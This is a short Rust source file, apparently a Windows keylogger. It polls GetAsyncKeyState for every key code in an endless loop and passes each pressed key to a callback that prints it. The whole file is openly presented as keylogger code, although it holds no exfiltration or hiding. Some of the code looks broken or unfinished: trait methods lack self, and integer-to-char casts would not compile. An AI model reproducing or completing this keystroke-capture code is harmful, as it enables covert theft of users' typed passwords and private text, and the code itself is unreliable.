use std::sync::mpsc;
use std::sync::mpsc::{Receiver, Sender};
use winapi::shared::windef::HHOOK;
use winapi::shared::minwindef::{LPARAM, WPARAM, LRESULT, UINT};
use winapi::um::winuser;
use winapi::ctypes::c_int;


trait Keylogger{
    //! Allows for a Keylogger to have a custom callback
    fn onKeyDown(key: char);
}

pub struct WinKeylogger{}

impl Keylogger for WinKeylogger{
    fn onKeyDown(key: char){
        println!("{}", key);
    }
}


pub fn run_keylogger(logger: &Keylogger){
    //! Create a windows keylogger

    loop{
        for i in 0 as c_int..255 as c_int {
            let key = unsafe { winuser::GetAsyncKeyState(i) };

            if (key & 1) > 0 {
                let s = i as char;

                logger.onKeyDown(s);
            }
        }
    }


}
